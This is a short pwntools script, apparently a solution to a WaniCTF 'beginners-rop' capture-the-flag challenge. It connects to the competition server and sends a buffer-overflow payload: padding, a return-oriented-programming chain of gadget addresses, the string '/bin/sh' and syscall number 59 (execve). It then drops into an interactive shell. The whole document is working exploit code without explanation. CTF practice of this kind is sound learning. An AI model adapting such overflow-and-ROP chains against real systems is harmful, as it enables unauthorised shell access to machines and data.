from pwn import *

io = remote('beginners-rop-pwn.wanictf.org', 9005)

payload = b'i'*40
payload += p64(0x000000000040139c)
payload += b'/bin/sh\0'
payload += p64(0x000000000040137e)
payload += p64(0x000000000040138d)
payload += p64(0x0000000000401371) + p64(59)
payload += p64(0x00000000004013af)
io.sendline(payload)
io.interactive()